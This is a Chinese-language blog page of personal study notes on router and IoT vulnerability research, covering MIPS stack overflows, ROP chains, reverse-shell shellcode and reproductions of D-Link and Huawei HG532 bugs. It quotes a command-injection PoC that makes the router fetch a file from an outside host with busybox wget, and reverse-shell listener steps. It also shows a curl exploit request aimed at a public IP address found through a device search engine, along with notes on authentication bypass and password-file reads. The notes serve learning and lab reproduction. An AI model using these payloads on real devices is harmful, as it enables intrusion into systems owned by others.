@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[TOC] IOT安全-文章学习笔记-1路由器漏洞挖掘之栈溢出入门（二）https://www.anquanke.com/post/id/171918  python写入16进制数据时，要加\x，即”\x12\x34” cat test时，要用双引号扩起来，即”cat test“ gdb中vmmap找基地址，同一个libc出现多次，基地址看第一个（属性为rwxp的）  路由器漏洞挖掘之栈溢出入门（">
+<meta name="keywords" content="路由器,漏洞分析,栈溢出,摄像头,命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IOT安全-文章学习笔记-1">
+<meta property="og:url" content="http://21guns.top/2020/04/17/iot/IOT安全-文章学习笔记-1/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[TOC] IOT安全-文章学习笔记-1路由器漏洞挖掘之栈溢出入门（二）https://www.anquanke.com/post/id/171918  python写入16进制数据时，要加\x，即”\x12\x34” cat test时，要用双引号扩起来，即”cat test“ gdb中vmmap找基地址，同一个libc出现多次，基地址看第一个（属性为rwxp的）  路由器漏洞挖掘之栈溢出入门（">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-07-091720.png">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-020432.png">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-024251.png">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-11-082532.png">
+<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-26-134232.jpg">
+<meta property="og:updated_time" content="2022-02-21T07:59:50.386Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IOT安全-文章学习笔记-1">
+<meta name="twitter:description" content="[TOC] IOT安全-文章学习笔记-1路由器漏洞挖掘之栈溢出入门（二）https://www.anquanke.com/post/id/171918  python写入16进制数据时，要加\x，即”\x12\x34” cat test时，要用双引号扩起来，即”cat test“ gdb中vmmap找基地址，同一个libc出现多次，基地址看第一个（属性为rwxp的）  路由器漏洞挖掘之栈溢出入门（">
+<meta name="twitter:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-07-091720.png">
+
+<link rel="canonical" href="http://21guns.top/2020/04/17/iot/IOT安全-文章学习笔记-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>IOT安全-文章学习笔记-1 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2020/04/17/iot/IOT安全-文章学习笔记-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          IOT安全-文章学习笔记-1
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-17 09:23:44" itemprop="dateCreated datePublished" datetime="2020-04-17T09:23:44+08:00">2020-04-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-21 15:59:50" itemprop="dateModified" datetime="2022-02-21T15:59:50+08:00">2022-02-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[TOC]</p>
+<h1 id="IOT安全-文章学习笔记-1"><a href="#IOT安全-文章学习笔记-1" class="headerlink" title="IOT安全-文章学习笔记-1"></a>IOT安全-文章学习笔记-1</h1><h2 id="路由器漏洞挖掘之栈溢出入门（二）"><a href="#路由器漏洞挖掘之栈溢出入门（二）" class="headerlink" title="路由器漏洞挖掘之栈溢出入门（二）"></a>路由器漏洞挖掘之栈溢出入门（二）</h2><p><a href="https://www.anquanke.com/post/id/171918" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171918</a></p>
+<ul>
+<li>python写入16进制数据时，要加\x，即”\x12\x34”</li>
+<li>cat test时，要用双引号扩起来，即”<code>cat test</code>“</li>
+<li>gdb中vmmap找基地址，同一个libc出现多次，基地址看第一个（属性为rwxp的）</li>
+</ul>
+<h2 id="路由器漏洞挖掘之栈溢出入门（三）ROP链的构造"><a href="#路由器漏洞挖掘之栈溢出入门（三）ROP链的构造" class="headerlink" title="路由器漏洞挖掘之栈溢出入门（三）ROP链的构造"></a>路由器漏洞挖掘之栈溢出入门（三）ROP链的构造</h2><p><a href="https://www.anquanke.com/post/id/172126" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172126</a></p>
+<ul>
+<li>sleep(1)的作用、rop链的构造</li>
+<li>patternLocOffset.py -l 500，实际生成1500</li>
+<li>qemu test “<code>cyclic 1500</code>“形式，gdb中得到0x66616163，然后cyclic -l 0x66616163得偏移508</li>
+<li>在 gdb 调试中找到 libc 的基地址。（vmmap 或者 i proc mappings+PID），后者试验失败</li>
+<li>pwntools生成填充文件，用python2运行，py3出错</li>
+<li>可用的shellcode：<a href="http://shell-storm.org/shellcode/files/shellcode-792.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-792.php</a></li>
+<li>最后的exp即py脚本，要\x加\，且payload最开始前加一行payload = “”</li>
+</ul>
+<h2 id="一步一步PWN路由器之rop技术实战"><a href="#一步一步PWN路由器之rop技术实战" class="headerlink" title="一步一步PWN路由器之rop技术实战"></a>一步一步PWN路由器之rop技术实战</h2><p><a href="https://xz.aliyun.com/t/1511（" target="_blank" rel="noopener">https://xz.aliyun.com/t/1511（</a></p>
+<ul>
+<li>python命令行中使用cyclic：cyclic()、cyclic_find()</li>
+<li>在 uclibc 的 scandir 或者 scandir64 的函数末尾有一个gadgets 可以操控几乎所有寄存器</li>
+</ul>
+<h2 id="一步一步PWN路由器之路由器环境修复-amp-amp-rop技术分析"><a href="#一步一步PWN路由器之路由器环境修复-amp-amp-rop技术分析" class="headerlink" title="一步一步PWN路由器之路由器环境修复&amp;&amp;rop技术分析"></a>一步一步PWN路由器之路由器环境修复&amp;&amp;rop技术分析</h2><p><a href="https://xz.aliyun.com/t/1509（" target="_blank" rel="noopener">https://xz.aliyun.com/t/1509（</a></p>
+<ul>
+<li>cat /proc/进程ID/maps ｜ grep libc，看加载了哪些lib文件（只能看有哪些，基址好像不对</li>
+</ul>
+<h2 id="路由器漏洞挖掘之栈溢出——反弹shell的payload构造"><a href="#路由器漏洞挖掘之栈溢出——反弹shell的payload构造" class="headerlink" title="路由器漏洞挖掘之栈溢出——反弹shell的payload构造"></a>路由器漏洞挖掘之栈溢出——反弹shell的payload构造</h2><p><a href="https://www.anquanke.com/post/id/173362" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173362</a></p>
+<ul>
+<li>gdb-multiarch远程调试，如果是本机，则可省略127的IP，即target remote:1234</li>
+<li>调试端口1234，传参端口1111，gdb连接1234，nc连接1111</li>
+<li>可以用pwntools中的cyclic替代patterLocOffset，cyclic可直接在命令行中使用，如cyclic 200，但是py2的好像不支持，先卸载py3的pwntools再重新安装，这样，cyclic时就会使用py3的，就可以直接跟数字，而py2中这样的语法错误</li>
+<li>py命令行中使用cyclic：cyclic(1000)、cyclic_find(0x61616e61)（直接在命令行中使用：cyclic 1000、cyclic -l 0x61616e61，按理是这样，但后一条报错，保险起见，还是py命令行中用（应该将0x61616e61转为字符串</li>
+<li>最后的exp即py脚本，要\x加\</li>
+<li>反弹shell的shellcode，<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/shellcode-860.php</a></li>
+<li>py中hex函数将10转16：192.168.156.212得到：0xc0、a8、9c、d4；</li>
+<li>因为是小端，所以IP是：0xd49ca8c0，最终汇编语句：li $a1,0xd49ca8c0</li>
+<li>利用pwntool将汇编指令转为二进制指令：from pwn import *、context.arch=“mips”（还有bits和endian字段，默认是32和little）、asm(“li $a1,0xd49ca8c0”)<br><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-07-091720.png" alt></li>
+<li>根据提示，下载binutils，<a href="http://docs.pwntools.com/en/stable/install/binutils.html，将$ARCH改为目标mips即可" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/install/binutils.html，将$ARCH改为目标mips即可</a></li>
+<li>asm(“li $a1,0xd49ca8c0”)得到b’{\x9e\x05&lt;\xc0\xa8\xa54’（py2中无b</li>
+<li>asm(“li $a1,0xd49ca8c0”).encode(‘hex’)得’9cd4053cc0a8a534’（py3中失败，因为python3中，编码的时候区分了字符串和二进制</li>
+<li>反弹shell的shellcode中，stg3_SC的第七行，前四后四不变，中间8个改为“\x9c\xd4\x05\x3c\xc0\xa8\xa5\x34”，即\xf8\xff\xa5\xaf\x9c\xd4\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf</li>
+<li>./qemu-mipsel -L . pwnable/ShellCode_Required/socket_bof 1111（运行目标）、nc -nvlp 31337（监听端口等待反弹shell）、python socket_bof_exp2.py（exp）</li>
+</ul>
+<h2 id="路由器漏洞挖掘之-DIR-805L-越权文件读取漏洞分析（应该是850"><a href="#路由器漏洞挖掘之-DIR-805L-越权文件读取漏洞分析（应该是850" class="headerlink" title="路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析（应该是850"></a>路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析（应该是850</h2><p><a href="https://www.anquanke.com/post/id/175625：" target="_blank" rel="noopener">https://www.anquanke.com/post/id/175625：</a></p>
+<ul>
+<li><p>ssh本地端口转发：mac：ssh -L 9000:192.168.0.1:80 <a href="mailto:lxl@192.168.156.212" target="_blank" rel="noopener">lxl@192.168.156.212</a>，随后Safari访问127.0.0.1:9000即可访问到路由器页面（9000本地端口，192.168.0.1:80路由器页面内网IP端口，192.168.156.212mac可连接的跳板IP</p>
+</li>
+<li><p>mac中msf实施攻击，一直失败，断定是各种端口代理的缘故，待解决（怎么通过ssh端口转发解决？</p>
+<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-020432.png" alt></p>
+</li>
+<li><p>静态分析：实际与文章不符，暂且搁置</p>
+</li>
+<li><p>burp中发送payload尝试复现，也失败</p>
+</li>
+</ul>
+<h2 id="路由器漏洞挖掘之-DIR-850-645-命令执行漏洞复现"><a href="#路由器漏洞挖掘之-DIR-850-645-命令执行漏洞复现" class="headerlink" title="路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现"></a>路由器漏洞挖掘之 DIR-850/645 命令执行漏洞复现</h2><p><a href="https://www.cnblogs.com/H4lo/p/10996949.html：" target="_blank" rel="noopener">https://www.cnblogs.com/H4lo/p/10996949.html：</a></p>
+<ul>
+<li><p>Ubuntu中安装msf，漏洞利用成功：set rhosts 192.168.0.1、set lhost 192.168.0.2、exploit</p>
+<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-09-024251.png" alt></p>
+</li>
+</ul>
+<h2 id="通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃"><a href="#通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃" class="headerlink" title="通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃"></a>通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃</h2><p><a href="https://www.freebuf.com/vuls/160040.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/160040.html</a></p>
+<ul>
+<li>其他分析文章中下载固件：<a href="https://xz.aliyun.com/t/4819、https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar" target="_blank" rel="noopener">https://xz.aliyun.com/t/4819、https://ia601506.us.archive.org/22/items/RouterHG532e/router%20HG532e.rar</a></li>
+<li>find搜索文件名：find . -name “ctrlt”</li>
+<li>grep搜索文件内容：grep -r “ctrlt” .（找到bin/upnp文件、-r遍历目录用的</li>
+<li>向mips虚拟机中传文件：tar -zcvf 1 squashfs-root/、scp 1 <a href="mailto:root@10.10.11.2" target="_blank" rel="noopener">root@10.10.11.2</a>:/root、虚拟机中tar -zxvf 1即可</li>
+<li>chroot squashfs-root/ sh：虚拟机中直接运行upnp失败，提示没有文件，应该是缺少so文件，应该chroot后运行sh后再运行他</li>
+<li>scp连接时出错，Host key verification failed：ssh-keygen -R 你要访问的IP地址</li>
+<li>chroot后，就以固件的文件系统为根目录了，原来一些系统命令就不可使用了，比如netstat观察端口，为此，chroot进入前再打开一个mips虚拟机命令行窗口，或者Ubuntu中ssh连接qemu-mips（多个终端：macOs、Ubuntu、qemu-mips、squashfs-root启动后的sh，注意区分</li>
+<li>chroot后打开sh，一旦运行mic，原ssh连接就卡了，发现ping也不通，sh中ctrl+c后ifconfig，发现eth0网卡都没有了，且出现一个br0网卡，应该是mic程序也有网卡的操作，与之前相矛盾了（重新设置eth0网卡的IP后，再运行mic，eth0就会没有，ssh自然就卡了，怎么解决？</li>
+<li>尝试一下本文的qemu-mips搭建方法，结合<a href="https://xz.aliyun.com/t/4130，测试还是失败" target="_blank" rel="noopener">https://xz.aliyun.com/t/4130，测试还是失败</a></li>
+<li>tunctl tap0的方法至少能让虚拟机启动起来（但是启动mic时导致错误），修改qemu-ifup脚本的方法启动都困难，总之，复现失败，来日再战</li>
+</ul>
+<h2 id="CVE-2017-17215-HG532命令注入漏洞分析"><a href="#CVE-2017-17215-HG532命令注入漏洞分析" class="headerlink" title="CVE-2017-17215-HG532命令注入漏洞分析"></a>CVE-2017-17215-HG532命令注入漏洞分析</h2><p><a href="https://xz.aliyun.com/t/4819" target="_blank" rel="noopener">https://xz.aliyun.com/t/4819</a></p>
+<ul>
+<li><p>漏洞利用的是upnp服务存在的注入漏洞实现任意命令执行</p>
+</li>
+<li><p>py的requests模块http请求</p>
+</li>
+<li><p>找漏洞所在点：公开信息得知upnp服务、根据poc中特征字符串</p>
+</li>
+<li><p>grep -r ”123“，搜寻内容</p>
+</li>
+<li><p>Ghidra 中漏洞函数伪代码（重命名后</p>
+<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-11-082532.png" alt></p>
+</li>
+<li><p>poc中关键点：</p>
+<p>  <code>&lt;NewStatusURL&gt;;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1;&lt;/NewStatusURL&gt;</code></p>
+<p>  <code>&lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</code></p>
+</li>
+<li><p>拼接后的buffer：<code>upg -g -U HUAWEIUPNP -t &#39;1 Firmware Upgrade Image&#39; -c upnp -r ;/bin/busybox wget -g 172.16.16.17 -l /tmp/1 -r /1; -d -</code>、</p>
+</li>
+<li><p>system执行buffer中的命令，遇到分号截断后，自然就可任意代码执行</p>
+</li>
+<li><p>netstat -l 查看哪些端口处于监听模式</p>
+</li>
+<li><p>监听端口，可以用nc，也可用python中的simpleServer模块指定端口就可</p>
+</li>
+<li><p>同10，复现失败</p>
+</li>
+</ul>
+<h2 id="路由器漏洞复现分析第二弹：CNVD-2018-01084"><a href="#路由器漏洞复现分析第二弹：CNVD-2018-01084" class="headerlink" title="路由器漏洞复现分析第二弹：CNVD-2018-01084"></a>路由器漏洞复现分析第二弹：CNVD-2018-01084</h2><p><a href="https://www.freebuf.com/vuls/162627.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/162627.html</a></p>
+<ul>
+<li>IDA打开Cgibin看一下main函数，如果要运行到处理service.cgi函数的分支，需要将一个参数设为相应的字符串（即字符串“service.cgi”对应servicecgi_main函数</li>
+<li>需要用qemu -0 的方式来指定参数第一个参数：chroot. ./qemu  -0 “service.cgi” ./htdocs/cgibin.</li>
+<li>servicecgi_main里面及其子函数cgibin_parse_request里面会取环境变量,如果不配置相应的环境变量那么cgibin运行后会直接走到http 解析失败的分支。因此在执行cgibin时还需要加入如下的环境变量，-E指定，-E REQUEST_METHOD=”POST”</li>
+<li>CGI中一般通过getenv或stdlib库函数getenv来获得环境变量获取post过来的数据<ul>
+<li>在cgibin中未找到stdin,scanf这样的函数或者字符串,因此把要注入的命令当做输入参数传递不能成功，</li>
+<li>仔细检查每一个genenv,把要注入的命令放到request_uri环境变量时候成功</li>
+</ul>
+</li>
+<li>问题：IDA hex窗口中，g跳往某地址失败，显示：Command “JumpAsk” failed，why？（重启ida解决，但是每次ctrl+F2重新调试都会出现此问题</li>
+<li>验证cookie的sess_ispoweruser函数,直接修改了返回值v0过掉：右键-modify value，将0改为1，手动修改返回值来改变程序执行流程（注意，为方便测试，后续都需要这样</li>
+<li>qemu使用-strace参数，让程序输出更多的调试信息，可以看到此时的系统调用</li>
+<li>qemu2.5 user模式并未实现execve函数，需要下载带补丁版本的qemu2.9版本并调加-evecve参数</li>
+<li>（Ubuntu18.04中qemu是2.11版本，也不支持execve，暂且搁置，以后需求多了再说</li>
+</ul>
+<h2 id="路由器漏洞复现分析第三弹：DVRF-INTRO题目分析"><a href="#路由器漏洞复现分析第三弹：DVRF-INTRO题目分析" class="headerlink" title="路由器漏洞复现分析第三弹：DVRF INTRO题目分析"></a>路由器漏洞复现分析第三弹：DVRF INTRO题目分析</h2><p><a href="https://www.freebuf.com/articles/wireless/163823.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/163823.html</a></p>
+<p>第一个题目stack_bof_01</p>
+<ul>
+<li>echo -e ‘\x50\x09\x40’：-e参数，可打印对应ascii码的字符</li>
+<li>偏移 = 目的字符串所在栈中位置 - ra在栈中位置 = 204</li>
+<li>Mips中函数的调用通常是jalr t9格式，因此t9保存的是函数的地址，因为我们是直接通过jr ra过来的，所以此处的t9值并不是函数地址因此会出错。<ul>
+<li>我们需要找一个gadget让t9中保存函数的起始地址 。</li>
+<li>找到：<code>lw $t9,arg_0($sp)、jalr $t9</code></li>
+</ul>
+</li>
+<li>此时要先找到libc的基地址，进入任意一个libc的提供的函数，列如memset：<ul>
+<li>找到memset函数的起始地址（绝对地址）：</li>
+<li>再用看下ida中memset的偏移：</li>
+<li>那么 libc_base=绝对地址 - 偏移</li>
+</ul>
+</li>
+<li>最终exp：<ul>
+<li>204偏移 + gadget地址（ra所在） + dat_shell地址（jr ra后栈顶元素）</li>
+<li>jr ra：跳到gadget，其将栈顶元素给t9并跳过去</li>
+<li>jr ra后，栈顶元素就是dat_shell</li>
+</ul>
+</li>
+</ul>
+<p>第二个题目 uaf_01</p>
+<ul>
+<li>Free掉第一个变量后，前四个字节变为00，后面不变</li>
+<li>此时再按输入的参数长度分配第二块内存,如果输入的参数长度不够长,那么就在free掉的第一块内存里取一块。<ul>
+<li>啥意思？？？</li>
+</ul>
+</li>
+<li>当参数长度大于等于13时,第二次malloc的内存是第一次malloc的地址,走到正确分支。<ul>
+<li>13怎么来的，为什么12不行13就行？</li>
+</ul>
+</li>
+</ul>
+<h2 id="路由器漏洞复现分析第四弹：CVE-2018-7034"><a href="#路由器漏洞复现分析第四弹：CVE-2018-7034" class="headerlink" title="路由器漏洞复现分析第四弹：CVE-2018-7034"></a>路由器漏洞复现分析第四弹：CVE-2018-7034</h2><p><a href="https://www.freebuf.com/articles/wireless/165716.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/wireless/165716.html</a></p>
+<ul>
+<li>从zoomeye中搜索并测试<ul>
+<li>curl -d “SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1” <a href="http://86.110.35.60:50000/getcfg.php（原文引号有误" target="_blank" rel="noopener">http://86.110.35.60:50000/getcfg.php（原文引号有误</a></li>
+<li>要带上端口号</li>
+<li>-d，data，发送post数据</li>
+</ul>
+</li>
+<li>雷同：<a href="https://xz.aliyun.com/t/6453" target="_blank" rel="noopener">https://xz.aliyun.com/t/6453</a></li>
+</ul>
+<h2 id="D-Link系列路由器漏洞挖掘入门"><a href="#D-Link系列路由器漏洞挖掘入门" class="headerlink" title="D-Link系列路由器漏洞挖掘入门"></a>D-Link系列路由器漏洞挖掘入门</h2><p><a href="https://paper.seebug.org/429/" target="_blank" rel="noopener">https://paper.seebug.org/429/</a></p>
+<ul>
+<li>继续往下看 <code>$result = &quot;OK&quot;;</code>无论是否执行成功，这里都会显示OK。所以这是一个盲注的命令执行。</li>
+<li>因为是盲注的命令执行，所以这里需要借助一个盲打平台（如：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye</a>），来验证漏洞是否存在</li>
+<li>CEYE平台的使用：<a href="https://www.cnblogs.com/zhaijiahui/p/9160913.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9160913.html</a></li>
+</ul>
+<hr>
+<ul>
+<li>已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。这么一看无法获取账号密码。</li>
+<li>但是我们可以从根路径开始配置<code>httpasswd</code>的路径，就可以绕过这个过滤了。</li>
+<li>设置<code>REQUIRE_FILE=/var/etc/httpasswd</code> 成功绕过</li>
+</ul>
+<hr>
+<ul>
+<li>默认情况下，Web界面中的所有页面都需要进行身份验证，但是某些页面（如 登录页面） 必须在认证之前访问。 </li>
+<li>为了让这些页面不进行认证，他们设置了一个PHP变量NO_NEED_AUTH：</li>
+<li>如果我们把<code>$NO_NEED_AUTH</code>值 设置为 1 那就绕过了认证进行任意操作。</li>
+<li>这里<code>AUTH_GROUP=0</code> 表示admin权限</li>
+</ul>
+<hr>
+<ul>
+<li>可以读取存储此设备信息的<code>DEVICE.ACCOUNT.xml.php</code>文件。</li>
+</ul>
+<h2 id="路由器0day漏洞挖掘实战"><a href="#路由器0day漏洞挖掘实战" class="headerlink" title="路由器0day漏洞挖掘实战"></a>路由器0day漏洞挖掘实战</h2><p><a href="https://www.anquanke.com/post/id/180714" target="_blank" rel="noopener">https://www.anquanke.com/post/id/180714</a></p>
+<ul>
+<li><p>MIPS IDAPYTHON审计辅助脚本：<a href="https://github.com/giantbranch/mipsAudit" target="_blank" rel="noopener">https://github.com/giantbranch/mipsAudit</a></p>
+</li>
+<li><p>简介</p>
+<ul>
+<li>路由器基本都是阉割版的linux系统</li>
+<li>架构以MIPS和ARM为主</li>
+<li>一般含有telnet服务</li>
+<li>很多基础命令以busybox的方式实现（如cat，chmod，date，echo，ifconfig，ls，kill等）</li>
+</ul>
+</li>
+<li><p>路由器常见漏洞</p>
+<ul>
+<li>Web漏洞：XSS、CSRF</li>
+<li>二进制漏洞：主要是栈溢出</li>
+<li>自带后门：如磊科路由器后门：私有协议，硬编码密码的后门</li>
+</ul>
+</li>
+<li><p>总览</p>
+<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-26-134232.jpg" alt="image-20200525111614382"></p>
+</li>
+<li><p>固件提取</p>
+<ul>
+<li>对智能硬件（路由器）的升级进行抓包，提取url</li>
+<li>通过烧录器读取拆卸下来的芯片</li>
+<li>通过mtd的方式：cat /proc/mtd查看分区信息、一般别人用dd命令来提取，其实用cp和cat也可以（用mtd 查看系统分区、备份恢复固件和刷新固件：<a href="http://blog.chinaunix.net/uid-28790518-id-5082378.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-28790518-id-5082378.html</a></li>
+<li>通过串口的方式：假如串口可以获得shell，那么可以使用第三种方法即mtd法（参考book 16.2</li>
+</ul>
+</li>
+<li><p>审计web源码，发现有些目录（下面的goform）不存在，代码在二进制中实现，故使用黑盒测试</p>
+<ul>
+<li>输入框中找xss</li>
+<li>找自带的功能，如命令执行</li>
+<li>burp测试</li>
+</ul>
+</li>
+<li><p><strong>其实跑出来的量还是很大的，我只不过是偶然的机会遇到了刚好又漏洞的</strong>（敏感函数如strcat和sprintf</p>
+</li>
+<li>发现后面goahead的pid都变了，那应该溢出崩溃重启了；上gdb调试确认溢出</li>
+<li>动态调试：<ul>
+<li>1-基于qemu（qemu模拟</li>
+<li>2-在设备上调试（qemu虚拟机</li>
+</ul>
+</li>
+<li>qemu有两种运作模式<ul>
+<li>用户模式（User mode），启动不同架构的Linux程序（如模拟一个mips程序</li>
+<li>系统模式（System mode），模拟整个电脑系统（如启动一个qume-mips虚拟机</li>
+</ul>
+</li>
+<li>注：有些程序比较依赖于特定的函数（比如nvram系列函数）就很难用qemu启动了</li>
